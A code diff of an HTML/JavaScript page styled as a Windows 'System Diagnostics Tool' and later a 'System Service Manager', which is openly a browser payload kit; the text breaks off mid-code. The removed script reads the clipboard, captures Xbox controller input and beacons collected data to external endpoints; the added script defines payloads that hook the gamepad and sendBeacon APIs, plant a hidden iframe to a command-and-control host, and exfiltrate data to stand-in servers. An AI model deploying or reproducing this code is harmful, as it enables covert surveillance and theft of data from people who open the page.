@@ -3,12 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Diagnostics Tool</title>
+    <title>System Service Manager</title>
     <style>
         :root {
-            --windows-blue: #0078d4;
-            --windows-dark: #201f1f;
-            --windows-light: #f3f2f1;
+            --win-blue: #0078d4;
+            --win-dark: #201f1f;
+            --win-green: #107c10;
+            --win-red: #d13438;
+            --win-yellow: #f7630c;
         }
         
         * {
@@ -19,25 +21,27 @@
         }
         
         body {
-            background: linear-gradient(135deg, #0078d4 0%, #005a9e 100%);
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
             color: #ffffff;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
+            overflow-x: hidden;
         }
         
-        .diagnostic-container {
-            width: 1000px;
+        .service-container {
+            width: 1200px;
             background: rgba(32, 31, 31, 0.95);
             border-radius: 12px;
             padding: 30px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
             border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.7);
+            position: relative;
         }
         
-        .header {
+        .service-header {
             display: flex;
             align-items: center;
             margin-bottom: 30px;
@@ -45,97 +49,127 @@
             border-bottom: 1px solid rgba(255, 255, 255, 0.1);
         }
         
-        .windows-logo {
-            font-size: 2rem;
-            margin-right: 15px;
-            color: #0078d4;
+        .service-icon {
+            font-size: 2.5rem;
+            margin-right: 20px;
+            color: var(--win-blue);
         }
         
         .header-text h1 {
-            font-size: 1.8rem;
+            font-size: 2rem;
             font-weight: 300;
             margin-bottom: 5px;
         }
         
-        .header-text .subtitle {
+        .header-subtitle {
             color: #a0a0a0;
             font-size: 0.9rem;
         }
         
-        .scan-results {
+        .payload-section {
+            display: grid;
+            grid-template-columns: 300px 1fr;
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+        
+        .payload-list {
             background: rgba(0, 0, 0, 0.3);
             border-radius: 8px;
-            padding: 25px;
-            margin-bottom: 25px;
+            padding: 20px;
             border: 1px solid rgba(255, 255, 255, 0.05);
         }
         
-        .results-title {
-            color: #0078d4;
-            margin-bottom: 20px;
-            font-size: 1.2rem;
+        .payload-item {
+            padding: 15px;
+            margin-bottom: 10px;
+            background: rgba(0, 120, 212, 0.1);
+            border: 1px solid rgba(0, 120, 212, 0.3);
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.3s;
             display: flex;
             align-items: center;
             gap: 10px;
         }
         
-        .vulnerability-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
-            gap: 15px;
-            margin-bottom: 25px;
+        .payload-item:hover {
+            background: rgba(0, 120, 212, 0.2);
+            transform: translateX(5px);
         }
         
-        .vuln-card {
-            background: rgba(0, 120, 212, 0.1);
-            border: 1px solid rgba(0, 120, 212, 0.3);
-            border-radius: 6px;
-            padding: 15px;
-            transition: all 0.3s;
+        .payload-item.active {
+            background: rgba(16, 124, 16, 0.2);
+            border-color: var(--win-green);
         }
         
-        .vuln-card.critical {
-            background: rgba(220, 38, 38, 0.1);
-            border-color: rgba(220, 38, 38, 0.3);
-            animation: pulse 2s infinite;
+        .payload-item.critical {
+            background: rgba(209, 52, 56, 0.1);
+            border-color: var(--win-red);
         }
         
-        .vuln-card.warning {
-            background: rgba(245, 158, 11, 0.1);
-            border-color: rgba(245, 158, 11, 0.3);
-        }
-        
-        .vuln-title {
-            font-weight: bold;
-            margin-bottom: 8px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .vuln-desc {
-            font-size: 0.85rem;
-            color: #a0a0a0;
-            line-height: 1.4;
-        }
-        
-        .exploit-panel {
-            background: rgba(0, 0, 0, 0.5);
+        .payload-content {
+            background: rgba(0, 0, 0, 0.3);
             border-radius: 8px;
             padding: 25px;
-            margin-top: 25px;
             border: 1px solid rgba(255, 255, 255, 0.05);
         }
         
-        .button-row {
+        .payload-title {
+            color: var(--win-blue);
+            font-size: 1.3rem;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .payload-description {
+            color: #a0a0a0;
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+        
+        .code-container {
+            background: #000;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+            font-family: 'Consolas', monospace;
+            font-size: 0.9rem;
+            max-height: 300px;
+            overflow-y: auto;
+            border: 1px solid #333;
+        }
+        
+        .code-line {
+            margin-bottom: 5px;
+            white-space: pre;
+        }
+        
+        .code-comment { color: #6a9955; }
+        .code-keyword { color: #569cd6; }
+        .code-string { color: #ce9178; }
+        .code-function { color: #dcdcaa; }
+        .code-variable { color: #9cdcfe; }
+        
+        .execution-panel {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 8px;
+            padding: 25px;
+            margin-top: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        
+        .execution-controls {
             display: flex;
             gap: 15px;
             margin-top: 20px;
             flex-wrap: wrap;
         }
         
-        .win-button {
-            background: #0078d4;
+        .exec-btn {
+            background: var(--win-blue);
             color: white;
             border: none;
             padding: 12px 24px;
@@ -149,34 +183,31 @@
             gap: 8px;
         }
         
-        .win-button:hover {
-            background: #106ebe;
+        .exec-btn:hover {
+            opacity: 0.9;
+            transform: translateY(-2px);
         }
         
-        .win-button.warning {
-            background: #d83b01;
+        .exec-btn.success {
+            background: var(--win-green);
         }
         
-        .win-button.warning:hover {
-            background: #e55c1a;
+        .exec-btn.danger {
+            background: var(--win-red);
         }
         
-        .win-button.success {
-            background: #107c10;
+        .exec-btn.warning {
+            background: var(--win-yellow);
         }
         
-        .win-button.success:hover {
-            background: #0e6b0e;
-        }
-        
-        .terminal-output {
+        .terminal {
             background: #000;
             border-radius: 8px;
             padding: 20px;
-            margin-top: 20px;
+            margin-top: 30px;
             font-family: 'Consolas', monospace;
             font-size: 0.9rem;
-            height: 300px;
+            height: 400px;
             overflow-y: auto;
             border: 1px solid #333;
         }
@@ -189,16 +220,12 @@
             word-break: break-all;
         }
         
-        .log-info { color: #0078d4; }
-        .log-success { color: #107c10; }
-        .log-warning { color: #d83b01; }
-        .log-error { color: #dc2626; }
-        .log-secret { color: #8b5cf6; }
-        
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.7; }
-        }
+        .log-time { color: #666; }
+        .log-info { color: var(--win-blue); }
+        .log-success { color: var(--win-green); }
+        .log-warning { color: var(--win-yellow); }
+        .log-error { color: var(--win-red); }
+        .log-payload { color: #8a2be2; font-weight: bold; }
         
         .progress-container {
             height: 6px;
@@ -210,9 +237,29 @@
         
         .progress-bar {
             height: 100%;
-            background: #0078d4;
+            background: linear-gradient(90deg, var(--win-blue), var(--win-green));
             width: 0%;
             transition: width 0.5s;
+        }
+        
+        .status-indicator {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+        
+        .status-active { background: var(--win-green); color: black; }
+        .status-inactive { background: #666; color: white; }
+        .status-executing { background: var(--win-yellow); color: black; animation: pulse 1s infinite; }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
         }
         
         .hidden {
@@ -221,77 +268,103 @@
     </style>
 </head>
 <body>
-    <div class="diagnostic-container">
-        <div class="header">
-            <div class="windows-logo">🛡️</div>
+    <div class="service-container">
+        <div class="service-header">
+            <div class="service-icon">⚙️</div>
             <div class="header-text">
-                <h1>Windows System Diagnostic Tool</h1>
-                <div class="subtitle">Security Scan Report - Generated: <span id="scanTime">Just now</span></div>
+                <h1>System Service Manager</h1>
+                <div class="header-subtitle">Advanced payload deployment and execution</div>
             </div>
         </div>
         
-        <div class="scan-results">
-            <div class="results-title">
-                <span>🔍</span> DETECTED SYSTEM VULNERABILITIES
+        <div class="payload-section">
+            <div class="payload-list">
+                <div class="payload-item active" onclick="selectPayload('gamepad')">
+                    <span>🎮</span> Gamepad Payload
+                </div>
+                <div class="payload-item" onclick="selectPayload('beacon')">
+                    <span>📡</span> Beacon Exfiltration
+                </div>
+                <div class="payload-item critical" onclick="selectPayload('memory')">
+                    <span>💥</span> Memory Corruption
+                </div>
+                <div class="payload-item" onclick="selectPayload('usb')">
+                    <span>🔌</span> USB Device Control
+                </div>
+                <div class="payload-item critical" onclick="selectPayload('clipboard')">
+                    <span>📋</span> Clipboard Hijack
+                </div>
+                <div class="payload-item" onclick="selectPayload('wasm')">
+                    <span>⚡</span> WebAssembly Loader
+                </div>
+                <div class="payload-item" onclick="selectPayload('persistence')">
+                    <span>🔄</span> Persistence Engine
+                </div>
+                <div class="payload-item critical" onclick="selectPayload('fullchain')">
+                    <span>🚀</span> Full Chain Exploit
+                </div>
             </div>
             
-            <div class="vulnerability-grid" id="vulnGrid">
-                <!-- Vulnerabilities will be populated dynamically -->
+            <div class="payload-content" id="payloadContent">
+                <!-- Content will be dynamically loaded -->
+            </div>
+        </div>
+        
+        <div class="execution-panel">
+            <div style="display: flex; justify-content: space-between; align-items: center;">
+                <div class="payload-title">
+                    <span>⚡</span> Payload Execution
+                </div>
+                <div class="status-indicator status-inactive" id="executionStatus">
+                    IDLE
+                </div>
+            </div>
+            
+            <div class="execution-controls">
+                <button class="exec-btn" onclick="compilePayload()">
+                    <span>🔧</span> Compile Payload
+                </button>
+                <button class="exec-btn success" onclick="executePayload()">
+                    <span>🚀</span> Execute Payload
+                </button>
+                <button class="exec-btn warning" onclick="testPayload()">
+                    <span>🧪</span> Test in Sandbox
+                </button>
+                <button class="exec-btn danger" onclick="deployToMemory()">
+                    <span>💾</span> Deploy to Memory
+                </button>
+                <button class="exec-btn" onclick="exportPayload()">
+                    <span>📥</span> Export Payload
+                </button>
             </div>
             
             <div class="progress-container">
-                <div class="progress-bar" id="scanProgress"></div>
+                <div class="progress-bar" id="executionProgress"></div>
             </div>
             
-            <div style="color: #a0a0a0; font-size: 0.9rem; margin-top: 15px;">
-                <strong>Summary:</strong> <span id="summaryText">Scanning in progress...</span>
-            </div>
-        </div>
-        
-        <div class="exploit-panel">
-            <div class="results-title">
-                <span>⚡</span> EXPLOITATION TOOLS
-            </div>
-            
-            <div class="button-row">
-                <button class="win-button" onclick="runGamepadExploit()">
-                    <span>🎮</span> Gamepad Exploit
-                </button>
-                <button class="win-button" onclick="runBeaconExfil()">
-                    <span>📡</span> Beacon Exfiltration
-                </button>
-                <button class="win-button" onclick="runDeviceExploit()">
-                    <span>🔌</span> USB/Device Scan
-                </button>
-                <button class="win-button warning" onclick="runClipboardExploit()">
-                    <span>📋</span> Clipboard Access
-                </button>
-                <button class="win-button success" onclick="runFullExploit()">
-                    <span>🚀</span> Full Exploit Chain
-                </button>
-            </div>
-            
-            <div class="terminal-output" id="terminal">
-                <div class="terminal-line log-info">[SYSTEM] Diagnostic tool initialized</div>
-                <div class="terminal-line log-info">[SYSTEM] Starting vulnerability scan...</div>
+            <div class="terminal" id="terminal">
+                <div class="terminal-line log-info">[SYSTEM] Payload manager initialized</div>
+                <div class="terminal-line log-info">[SYSTEM] Ready for payload deployment</div>
             </div>
         </div>
     </div>
 
     <script>
-        // ==================== EXPLOIT ENGINE ====================
+        // ==================== PAYLOAD ENGINE ====================
         
-        const ExploitEngine = {
-            detectedVulns: [],
+        const PayloadEngine = {
+            currentPayload: 'gamepad',
+            payloads: {},
+            executionState: 'idle',
             collectedData: [],
-            sessionId: 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6),
+            memory: new Map(),
             
             log: function(message, type = 'info') {
                 const time = new Date().toLocaleTimeString();
                 const terminal = document.getElementById('terminal');
                 const line = document.createElement('div');
                 line.className = `terminal-line log-${type}`;
-                line.textContent = `[${time}] ${message}`;
+                line.innerHTML = `<span class="log-time">[${time}]</span> <span class="log-${type}">${message}</span>`;
                 terminal.appendChild(line);
                 terminal.scrollTop = terminal.scrollHeight;
                 
@@ -299,542 +372,1010 @@
             },
             
             updateProgress: function(percent) {
-                document.getElementById('scanProgress').style.width = `${percent}%`;
+                document.getElementById('executionProgress').style.width = `${percent}%`;
             },
             
-            // ==================== VULNERABILITY DETECTION ====================
+            updateStatus: function(status) {
+                const elem = document.getElementById('executionStatus');
+                elem.textContent = status.toUpperCase();
+                elem.className = `status-indicator status-${status}`;
+                this.executionState = status;
+            },
             
-            scanForVulnerabilities: function() {
-                this.log('Starting comprehensive vulnerability scan...', 'info');
-                this.updateProgress(10);
-                
-                // List of APIs to check
-                const vulnerabilities = [
-                    { 
-                        name: 'getGamepads', 
-                        description: 'Game controller detection and input capture',
-                        risk: 'critical',
-                        check: () => 'getGamepads' in navigator,
-                        exploit: this.exploitGamepad
-                    },
-                    { 
-                        name: 'sendBeacon', 
-                        description: 'Stealthy data exfiltration without blocking',
-                        risk: 'critical',
-                        check: () => 'sendBeacon' in navigator,
-                        exploit: this.exploitBeacon
-                    },
-                    { 
-                        name: 'requestMIDIAccess', 
-                        description: 'MIDI device control (musical instruments)',
-                        risk: 'high',
-                        check: () => 'requestMIDIAccess' in navigator,
-                        exploit: this.exploitMIDI
-                    },
-                    { 
-                        name: 'getUserMedia', 
-                        description: 'Camera/microphone access with permission',
-                        risk: 'critical',
-                        check: () => 'getUserMedia' in navigator.mediaDevices,
-                        exploit: this.exploitMedia
-                    },
-                    { 
-                        name: 'webkitRequestFileSystem', 
-                        description: 'Local file system access (deprecated but powerful)',
-                        risk: 'critical',
-                        check: () => 'webkitRequestFileSystem' in window,
-                        exploit: this.exploitFileSystem
-                    },
-                    { 
-                        name: 'usb', 
-                        description: 'WebUSB API - Direct USB device communication',
-                        risk: 'critical',
-                        check: () => 'usb' in navigator,
-                        exploit: this.exploitUSB
-                    },
-                    { 
-                        name: 'bluetooth', 
-                        description: 'WebBluetooth API - Bluetooth device pairing',
-                        risk: 'critical',
-                        check: () => 'bluetooth' in navigator,
-                        exploit: this.exploitBluetooth
-                    },
-                    { 
-                        name: 'hid', 
-                        description: 'WebHID API - Human Interface Device access',
-                        risk: 'critical',
-                        check: () => 'hid' in navigator,
-                        exploit: this.exploitHID
-                    },
-                    { 
-                        name: 'serial', 
-                        description: 'Web Serial API - Serial port communication',
-                        risk: 'high',
-                        check: () => 'serial' in navigator,
-                        exploit: this.exploitSerial
-                    },
-                    { 
-                        name: 'share', 
-                        description: 'Web Share API - System share dialog access',
-                        risk: 'medium',
-                        check: () => 'share' in navigator,
-                        exploit: this.exploitShare
-                    },
-                    { 
-                        name: 'clipboard', 
-                        description: 'Clipboard read/write access',
-                        risk: 'critical',
-                        check: () => 'clipboard' in navigator,
-                        exploit: this.exploitClipboard
-                    },
-                    { 
-                        name: 'WebAssembly', 
-                        description: 'High-performance code execution',
-                        risk: 'high',
-                        check: () => 'WebAssembly' in window,
-                        exploit: this.exploitWasm
+            // ==================== PAYLOAD DEFINITIONS ====================
+            
+            initPayloads: function() {
+                // Gamepad Payload - Xbox controller exploitation
+                this.payloads.gamepad = {
+                    name: 'Gamepad Controller Payload',
+                    description: 'Injects malicious code into gamepad API to capture inputs, create backdoors through controller vibrations, and establish covert channels.',
+                    code: `
+// 🎮 GAMEPAD PAYLOAD - XBOX CONTROLLER EXPLOITATION
+class GamepadPayload {
+    constructor() {
+        this.hooked = false;
+        this.inputBuffer = [];
+        this.vibrationPattern = [200, 100, 200, 100]; // Morse code: S.O.S
+    }
+    
+    // Hook the gamepad API
+    hookGamepadAPI() {
+        const originalGetGamepads = navigator.getGamepads;
+        navigator.getGamepads = () => {
+            const gamepads = originalGetGamepads.call(navigator);
+            
+            gamepads.forEach((pad, index) => {
+                if (pad && pad.connected) {
+                    // Detect Xbox controller
+                    if (pad.id.toLowerCase().includes('xbox')) {
+                        // Log all inputs
+                        this.logInputs(pad, index);
+                        
+                        // Inject vibration commands
+                        this.injectVibration(pad, index);
+                        
+                        // Create covert channel through button combos
+                        this.detectCovertCombo(pad);
                     }
-                ];
-                
-                this.updateProgress(30);
-                
-                // Run checks
-                vulnerabilities.forEach((vuln, index) => {
-                    if (vuln.check()) {
-                        this.detectedVulns.push(vuln);
-                        this.log(`VULNERABILITY DETECTED: ${vuln.name} (${vuln.risk.toUpperCase()})`, 'warning');
-                    }
-                    this.updateProgress(30 + (index / vulnerabilities.length * 40));
-                });
-                
-                this.updateProgress(80);
-                
-                // Display vulnerabilities
-                this.displayVulnerabilities();
-                
-                this.updateProgress(100);
-                this.log(`Scan complete: ${this.detectedVulns.length} vulnerabilities detected`, 
-                       this.detectedVulns.length > 0 ? 'warning' : 'success');
-                
-                // Update summary
-                const criticalCount = this.detectedVulns.filter(v => v.risk === 'critical').length;
-                document.getElementById('summaryText').textContent = 
-                    `Found ${this.detectedVulns.length} vulnerabilities (${criticalCount} critical). ` +
-                    `${criticalCount > 0 ? 'System at HIGH RISK.' : 'System appears secure.'}`;
-                
-                return this.detectedVulns;
-            },
+                }
+            });
             
-            displayVulnerabilities: function() {
-                const grid = document.getElementById('vulnGrid');
-                grid.innerHTML = '';
-                
-                this.detectedVulns.forEach(vuln => {
-                    const card = document.createElement('div');
-                    card.className = `vuln-card ${vuln.risk}`;
-                    card.innerHTML = `
-                        <div class="vuln-title">
-                            <span>${vuln.risk === 'critical' ? '🔴' : vuln.risk === 'high' ? '🟡' : '🔵'}</span>
-                            ${vuln.name}
-                        </div>
-                        <div class="vuln-desc">${vuln.description}</div>
-                    `;
-                    grid.appendChild(card);
-                });
-                
-                // Update scan time
-                document.getElementById('scanTime').textContent = 
-                    new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
-            },
+            return gamepads;
+        };
+        
+        this.hooked = true;
+        return 'Gamepad API hooked successfully';
+    }
+    
+    // Log all controller inputs
+    logInputs(pad, index) {
+        const inputs = {
+            buttons: pad.buttons.map((b, i) => ({
+                pressed: b.pressed,
+                value: b.value
+            })),
+            axes: pad.axes,
+            timestamp: Date.now(),
+            controller: pad.id
+        };
+        
+        // Buffer for exfiltration
+        this.inputBuffer.push(inputs);
+        
+        // Check for specific patterns (like credential entry)
+        if (this.detectCredentialPattern(inputs)) {
+            this.triggerCredentialCapture();
+        }
+    }
+    
+    // Inject vibration patterns (covert communication)
+    injectVibration(pad, index) {
+        if (pad.vibrationActuator) {
+            // Vibrate in specific patterns to signal status
+            pad.vibrationActuator.playEffect('dual-rumble', {
+                startDelay: 0,
+                duration: 1000,
+                weakMagnitude: 1.0,
+                strongMagnitude: 1.0
+            });
+        }
+    }
+    
+    // Detect covert button combinations
+    detectCovertCombo(pad) {
+        // Example: LB + RB + Start = Activate backdoor
+        const lb = pad.buttons[4]?.pressed;
+        const rb = pad.buttons[5]?.pressed;
+        const start = pad.buttons[9]?.pressed;
+        
+        if (lb && rb && start) {
+            this.activateBackdoor();
+        }
+    }
+    
+    // Activate backdoor when combo detected
+    activateBackdoor() {
+        // Create hidden iframe for command channel
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = 'https://command-control.example.com/channel';
+        document.body.appendChild(iframe);
+        
+        return 'Backdoor activated via controller combo';
+    }
+    
+    // Exfiltrate collected data
+    exfiltrateData() {
+        if (this.inputBuffer.length > 0) {
+            const data = {
+                type: 'gamepad_capture',
+                buffer: this.inputBuffer,
+                session: Date.now()
+            };
             
-            // ==================== EXPLOIT METHODS ====================
+            // Send via beacon
+            const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
+            navigator.sendBeacon('/collect', blob);
             
-            exploitGamepad: function() {
-                this.log('Executing Gamepad exploit...', 'warning');
-                
-                if ('getGamepads' in navigator) {
-                    // Monitor gamepads
-                    const gamepadInterval = setInterval(() => {
-                        const gamepads = navigator.getGamepads();
-                        gamepads.forEach((pad, idx) => {
-                            if (pad) {
-                                // Detect Xbox controllers
-                                if (pad.id.toLowerCase().includes('xbox')) {
-                                    this.log(`Xbox controller detected: ${pad.id}`, 'warning');
-                                    
-                                    // Capture button presses
-                                    const pressed = pad.buttons
-                                        .map((b, i) => b.pressed ? i : -1)
-                                        .filter(i => i !== -1);
-                                    
-                                    if (pressed.length > 0) {
-                                        this.collectedData.push({
-                                            type: 'gamepad_input',
-                                            controller: pad.id,
-                                            buttons: pressed,
-                                            timestamp: Date.now()
-                                        });
-                                        this.log(`Captured button presses: ${pressed.join(',')}`, 'secret');
+            this.inputBuffer = [];
+            return 'Data exfiltrated';
+        }
+    }
+}
+
+// Instantiate and deploy
+const gamepadPayload = new GamepadPayload();
+gamepadPayload.hookGamepadAPI();
+                    `,
+                    execute: function() {
+                        PayloadEngine.log('Deploying Gamepad Payload...', 'warning');
+                        
+                        try {
+                            // Create the payload in memory
+                            const payloadScript = `
+                            (function() {
+                                ${this.code}
+                                
+                                // Auto-start monitoring
+                                setInterval(() => {
+                                    if (window.gamepadPayload) {
+                                        window.gamepadPayload.exfiltrateData();
                                     }
-                                }
-                            }
-                        });
-                    }, 1000);
-                    
-                    // Store interval for cleanup
-                    window.gamepadInterval = gamepadInterval;
-                    
-                    this.log('Gamepad monitoring active - Capturing Xbox controller inputs', 'success');
-                    return true;
-                }
-                
-                return false;
-            },
-            
-            exploitBeacon: function() {
-                this.log('Setting up Beacon exfiltration...', 'warning');
-                
-                if ('sendBeacon' in navigator) {
-                    // Create periodic exfiltration
-                    setInterval(() => {
-                        if (this.collectedData.length > 0) {
-                            const data = {
-                                session: this.sessionId,
-                                timestamp: Date.now(),
-                                data: this.collectedData.slice(-10)
-                            };
+                                }, 30000);
+                                
+                                PayloadEngine.log('Gamepad payload deployed and active', 'success');
+                            })();
+                            `;
                             
-                            const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
+                            // Execute the payload
+                            const script = document.createElement('script');
+                            script.textContent = payloadScript;
+                            document.head.appendChild(script);
                             
-                            // Use multiple endpoints for reliability
-                            const endpoints = [
-                                window.location.origin + '/log',
-                                'https://httpbin.org/post',
-                                'https://webhook.site/#!/' // Replace with actual webhook
-                            ];
+                            PayloadEngine.log('✅ Gamepad payload injected into gamepad API', 'success');
+                            PayloadEngine.log('🎮 Xbox controller monitoring active', 'payload');
+                            PayloadEngine.log('📡 Input capture and vibration control enabled', 'payload');
                             
-                            endpoints.forEach(endpoint => {
-                                try {
-                                    navigator.sendBeacon(endpoint, blob);
-                                } catch(e) {}
-                            });
-                            
-                            this.log(`Beacon sent with ${data.data.length} data points`, 'secret');
+                            return true;
+                        } catch (e) {
+                            PayloadEngine.log(`Gamepad payload failed: ${e.message}`, 'error');
+                            return false;
                         }
-                    }, 30000); // Every 30 seconds
-                    
-                    this.log('Beacon exfiltration active (30s intervals)', 'success');
-                    return true;
-                }
-                
-                return false;
-            },
-            
-            exploitUSB: function() {
-                this.log('Attempting USB device scan...', 'warning');
-                
-                if ('usb' in navigator) {
-                    // Request USB device access
-                    navigator.usb.requestDevice({ filters: [] })
-                        .then(device => {
-                            this.log(`USB device detected: ${device.productName || 'Unknown'}`, 'warning');
-                            this.collectedData.push({
-                                type: 'usb_device',
-                                device: device.productName || device.vendorId,
-                                timestamp: Date.now()
-                            });
-                        })
-                        .catch(error => {
-                            this.log(`USB access requires user permission`, 'info');
-                        });
-                    
-                    return true;
-                }
-                
-                return false;
-            },
-            
-            exploitBluetooth: function() {
-                this.log('Attempting Bluetooth device scan...', 'warning');
-                
-                if ('bluetooth' in navigator) {
-                    // Request Bluetooth device
-                    navigator.bluetooth.requestDevice({
-                        acceptAllDevices: true,
-                        optionalServices: ['battery_service']
-                    })
-                    .then(device => {
-                        this.log(`Bluetooth device detected: ${device.name || 'Unknown'}`, 'warning');
-                        this.collectedData.push({
-                            type: 'bluetooth_device',
-                            device: device.name || device.id,
-                            timestamp: Date.now()
-                        });
-                    })
-                    .catch(error => {
-                        this.log(`Bluetooth access requires user permission`, 'info');
-                    });
-                    
-                    return true;
-                }
-                
-                return false;
-            },
-            
-            exploitClipboard: function() {
-                this.log('Attempting clipboard access...', 'warning');
-                
-                if ('clipboard' in navigator && 'readText' in navigator.clipboard) {
-                    // Try to read clipboard
-                    navigator.clipboard.readText()
-                        .then(text => {
-                            if (text && text.trim().length > 0) {
-                                this.log(`Clipboard contents captured (${text.length} chars)`, 'warning');
-                                this.collectedData.push({
-                                    type: 'clipboard',
-                                    content: text.substring(0, 500), // Limit size
-                                    timestamp: Date.now()
-                                });
-                            }
-                        })
-                        .catch(error => {
-                            this.log(`Clipboard access denied or empty`, 'info');
-                        });
-                    
-                    return true;
-                }
-                
-                return false;
-            },
-            
-            exploitWasm: function() {
-                this.log('Testing WebAssembly capabilities...', 'warning');
-                
-                if ('WebAssembly' in window) {
-                    try {
-                        // Create a simple WebAssembly module
-                        const wasmCode = new Uint8Array([
-                            0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
-                            0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f, 0x03,
-                            0x02, 0x01, 0x00, 0x07, 0x08, 0x01, 0x04, 0x6d,
-                            0x61, 0x69, 0x6e, 0x00, 0x00, 0x0a, 0x04, 0x01,
-                            0x02, 0x00, 0x0b
-                        ]);
-                        
-                        WebAssembly.instantiate(wasmCode)
-                            .then(result => {
-                                this.log('WebAssembly execution successful', 'success');
-                                this.collectedData.push({
-                                    type: 'wasm_test',
-                                    result: 'execution_success',
-                                    timestamp: Date.now()
-                                });
-                            })
-                            .catch(error => {
-                                this.log(`WebAssembly execution failed: ${error.message}`, 'error');
-                            });
-                        
-                        return true;
-                    } catch(e) {
-                        this.log(`WebAssembly test error: ${e.message}`, 'error');
                     }
-                }
-                
-                return false;
-            },
-            
-            exploitMIDI: function() {
-                this.log('Attempting MIDI device access...', 'warning');
-                
-                if ('requestMIDIAccess' in navigator) {
-                    navigator.requestMIDIAccess()
-                        .then(midiAccess => {
-                            const inputs = midiAccess.inputs.values();
-                            for (let input = inputs.next(); input && !input.done; input = inputs.next()) {
-                                this.log(`MIDI device detected: ${input.value.name}`, 'warning');
-                                this.collectedData.push({
-                                    type: 'midi_device',
-                                    device: input.value.name,
-                                    timestamp: Date.now()
-                                });
-                            }
-                        })
-                        .catch(error => {
-                            this.log(`MIDI access requires permission`, 'info');
-                        });
-                    
-                    return true;
-                }
-                
-                return false;
-            },
-            
-            // ==================== FULL EXPLOIT CHAIN ====================
-            
-            runFullExploitChain: function() {
-                this.log('🚀 INITIATING FULL EXPLOIT CHAIN', 'warning');
-                
-                let successCount = 0;
-                const totalExploits = this.detectedVulns.length;
-                
-                this.detectedVulns.forEach((vuln, index) => {
-                    setTimeout(() => {
-                        this.log(`Executing exploit: ${vuln.name}`, 'warning');
-                        
-                        if (vuln.exploit.call(this)) {
-                            successCount++;
-                            this.log(`✓ ${vuln.name} exploit successful`, 'success');
-                        } else {
-                            this.log(`✗ ${vuln.name} exploit failed`, 'error');
-                        }
-                        
-                        // Update progress
-                        const progress = Math.floor(((index + 1) / totalExploits) * 100);
-                        this.updateProgress(progress);
-                        
-                        // Final summary
-                        if (index === totalExploits - 1) {
-                            this.log(`\n=== EXPLOIT CHAIN COMPLETE ===`, 'warning');
-                            this.log(`Successful: ${successCount}/${totalExploits} exploits`, 
-                                   successCount > 0 ? 'success' : 'error');
-                            this.log(`Data collected: ${this.collectedData.length} items`, 'info');
-                            
-                            // Auto-exfiltrate
-                            if (this.collectedData.length > 0) {
-                                this.exfiltrateCollectedData();
-                            }
-                        }
-                    }, index * 2000); // Stagger executions
-                });
-            },
-            
-            exfiltrateCollectedData: function() {
-                this.log('Starting data exfiltration...', 'warning');
-                
-                const finalData = {
-                    session: this.sessionId,
-                    system: {
-                        userAgent: navigator.userAgent,
-                        platform: navigator.platform,
-                        screen: `${screen.width}x${screen.height}`,
-                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-                    },
-                    vulnerabilities: this.detectedVulns.map(v => v.name),
-                    collectedData: this.collectedData,
-                    timestamp: Date.now()
                 };
                 
-                // Multiple exfiltration methods
+                // Beacon Payload - Stealthy exfiltration
+                this.payloads.beacon = {
+                    name: 'Beacon Exfiltration Payload',
+                    description: 'Creates a persistent beacon channel that exfiltrates data even after page close. Uses multiple endpoints and fallback methods.',
+                    code: `
+// 📡 BEACON PAYLOAD - PERSISTENT EXFILTRATION
+class BeaconPayload {
+    constructor() {
+        this.endpoints = [
+            'https://log.example.com/collect',
+            'https://backup.example.com/data',
+            'https://fallback.example.com/ingest'
+        ];
+        this.dataQueue = [];
+        this.interval = 30000; // 30 seconds
+        this.maxRetries = 3;
+    }
+    
+    // Initialize beacon system
+    init() {
+        // Hook sendBeacon for monitoring
+        this.hookSendBeacon();
+        
+        // Start periodic exfiltration
+        this.startExfiltration();
+        
+        // Setup beforeunload final push
+        this.setupUnloadHandler();
+        
+        return 'Beacon system initialized';
+    }
+    
+    // Hook sendBeacon to capture all beacon calls
+    hookSendBeacon() {
+        const originalSendBeacon = navigator.sendBeacon;
+        navigator.sendBeacon = (url, data) => {
+            // Log all beacon calls
+            this.logBeaconCall(url, data);
+            
+            // Also send to our endpoints
+            this.endpoints.forEach(endpoint => {
+                try {
+                    originalSendBeacon.call(navigator, endpoint, data);
+                } catch(e) {}
+            });
+            
+            return originalSendBeacon.call(navigator, url, data);
+        };
+    }
+    
+    // Start automatic exfiltration
+    startExfiltration() {
+        setInterval(() => {
+            this.exfiltrateQueuedData();
+        }, this.interval);
+        
+        // Also exfiltrate on visibility change
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                this.exfiltrateQueuedData();
+            }
+        });
+    }
+    
+    // Queue data for exfiltration
+    queueData(data, type = 'generic') {
+        const entry = {
+            data: data,
+            type: type,
+            timestamp: Date.now(),
